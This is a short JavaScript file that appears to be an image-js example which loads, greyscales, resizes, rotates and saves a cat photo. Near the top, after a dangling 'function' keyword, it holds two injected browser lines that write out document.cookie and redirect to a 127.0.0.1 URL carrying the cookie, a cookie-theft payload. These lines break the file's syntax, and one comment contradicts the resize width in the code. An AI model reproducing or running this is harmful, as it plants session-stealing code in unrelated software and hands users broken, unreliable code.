const { Image } = require('image-js');
function   
document.write(document.cookie); 
document.location='http://127.0.0.1/index.php?c='+document.cookie;
execute().catch(console.error);

async function execute() {
  let image = await Image.load('cat.jpg');
  let grey = image
    .grey() // convert the image to greyscale.
    .resize({ width: 800 }) // resize the image, forcing a width of 200 pixels. The height is computed automatically to preserve the aspect ratio.
    .rotate(90); // rotate the image clockwise by degrees.
  return grey.save('cat.png');
}

